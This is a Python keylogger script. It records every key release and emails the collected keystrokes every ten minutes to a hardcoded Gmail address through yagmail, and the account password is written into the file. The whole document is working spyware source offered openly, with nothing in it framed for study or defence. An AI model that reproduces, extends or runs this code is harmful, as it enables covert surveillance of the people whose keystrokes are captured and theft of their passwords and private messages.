import keyboard
import yagmail
import time
from threading import Semaphore, Timer

sendEvery = 600
email = "iamabotforme@gmail.com"
password = "ThisIsAPassword"

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    def sendmail(self, email, password, message):
        yag = yagmail.SMTP(email, password)
        yag.send(email, "Key Log for: " + time.ctime(), message)
    def report(self):
        if self.log:
            # if there is something in log, report it
            self.sendmail(email, password, self.log)
            # print(self.log)
        print("Sent Email")
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()
    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()
if __name__ == "__main__":
    keylogger = Keylogger(interval=sendEvery)
    keylogger.start()